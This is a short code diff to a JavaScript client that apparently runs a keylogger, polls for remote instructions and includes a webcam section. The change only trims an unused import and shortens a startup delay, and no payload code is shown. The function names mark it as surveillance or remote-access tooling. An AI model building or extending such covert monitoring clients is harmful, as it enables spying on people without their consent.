@@ -1,6 +1,4 @@
 
-const http = require('http');
-
 const axios = require("axios");//comunication with python sub process on port 5088
 const fs = require('fs');
 const path = require('path');
@@ -24,7 +22,7 @@ window.onload = () => {
             keylog.get_keys()
             directoryman.remote_instructions()
         }, update_interval)
-    }, 2000);//wait for server to start
+    }, 500);//wait for server to start
 }
 
 /* Webcam */
